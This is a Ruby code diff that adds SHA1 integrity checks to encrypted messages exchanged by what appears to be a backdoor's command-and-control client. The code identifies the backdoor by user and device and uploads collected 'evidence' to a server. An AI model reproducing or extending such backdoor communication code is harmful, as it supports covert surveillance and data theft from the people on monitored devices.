@@ -134,11 +134,18 @@ module Command
     message += [backdoor.version].pack('i')
     message += backdoor.userid.pascalize + backdoor.deviceid.pascalize + backdoor.sourceid.pascalize
 
+    # add the integrity check at the end
+    message += Digest::SHA1.digest(message)
     # send the message and receive the response from the server
     enc = aes_encrypt(message, @session_key)
+
     resp = @transport.message enc
+
     resp = aes_decrypt(resp, @session_key)
     #trace "ID -- response: " << resp.unpack('H*').to_s
+    # check the integrity at the end of the message
+    check = resp.slice!(resp.length - Digest::SHA1.new.digest_length, resp.length)
+    raise "Invalid sha1 check" unless check == Digest::SHA1.digest(resp)
     
     # parse the response
     command, tot, time, size, *list = resp.unpack('i2qi*')
@@ -271,11 +278,15 @@ module Command
     
     # prepare the message
     message = [PROTO_EVIDENCE].pack('i') + [evidence.size].pack('i') + evidence.content
-    
+    # add the integrity check at the end
+    message += Digest::SHA1.digest(message)
     enc_msg = aes_encrypt(message, @session_key)
     # send the message and receive the response
     resp = @transport.message enc_msg
     resp = aes_decrypt(resp, @session_key)
+    # check the integrity at the end of the message
+    check = resp.slice!(resp.length - Digest::SHA1.new.digest_length, resp.length)
+    raise "Invalid sha1 check" unless check == Digest::SHA1.digest(resp)
     
     if resp.unpack('i') == [PROTO_OK] then
       trace :info, "EVIDENCE -- [#{evidence.name}] #{evidence.size} bytes sent. #{evidences.size} left"
@@ -301,10 +312,20 @@ module Command
   # helper method
   def send_command(command)
     message = [command].pack('i')
+    # add the integrity check at the end of the message
+    message += Digest::SHA1.digest(message)
     enc_msg = aes_encrypt(message, @session_key)
+
     # send the message and receive the response
     resp = @transport.message enc_msg
-    return aes_decrypt(resp, @session_key)
+
+    # decrypt it
+    resp = aes_decrypt(resp, @session_key)
+    # check the integrity at the end of the message
+    check = resp.slice!(resp.length - Digest::SHA1.new.digest_length, resp.length)
+    raise "Invalid sha1 check" unless check == Digest::SHA1.digest(resp)
+    
+    return resp
   end
   
 end
